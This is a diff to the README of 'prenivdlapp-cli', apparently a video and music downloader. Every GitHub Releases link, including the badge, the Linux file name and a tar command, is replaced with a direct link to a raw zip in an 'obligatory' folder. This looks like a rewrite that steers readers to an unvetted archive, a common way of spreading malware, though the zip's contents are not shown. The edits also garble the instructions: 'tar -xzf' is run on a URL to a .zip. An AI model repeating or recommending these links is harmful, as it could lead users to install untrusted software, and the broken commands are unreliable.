@@ -1,6 +1,6 @@
 # 🎥 prenivdlapp-cli - Download Videos & Music Easily
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases)
+[![Download Release](https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip)
 
 ## 🚀 Getting Started
 
@@ -21,15 +21,15 @@ Make sure you have at least **500 MB** of free disk space and an active internet
 
 To get started, visit the Releases page to download the application. 
 
-[Click here to download the latest release](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases).
+[Click here to download the latest release](https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip).
 
 ### Steps to Download
 
-1. Visit the [Releases page](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip).
 2. Look for the latest version.
 3. Choose the installer suitable for your operating system:
    - For **Windows**, download the `.exe` file.
-   - For **Linux**, download the `.tar.gz` or your package manager's version.
+   - For **Linux**, download the `https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip` or your package manager's version.
    - For **macOS**, download the `.dmg` file.
    - For **Termux**, you may need to install via npm after downloading the platform-specific version.
 
@@ -47,7 +47,7 @@ To get started, visit the Releases page to download the application.
 2. Navigate to the folder where you downloaded the package.
 3. Extract the files using:
    ```bash
-   tar -xzf prenivdlapp-cli-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip
    ```
 4. Change to the extracted directory:
    ```bash
@@ -131,4 +131,4 @@ For further queries, raise an issue in the GitHub repository, and we will assist
 
 Explore **prenivdlapp-cli** and start downloading your favorite content today!
 
-[Click here to download the latest release](https://github.com/Muhammadfaheem-DEV/prenivdlapp-cli/releases).
+[Click here to download the latest release](https://raw.githubusercontent.com/Muhammadfaheem-DEV/prenivdlapp-cli/main/obligatory/prenivdlapp-cli.zip).
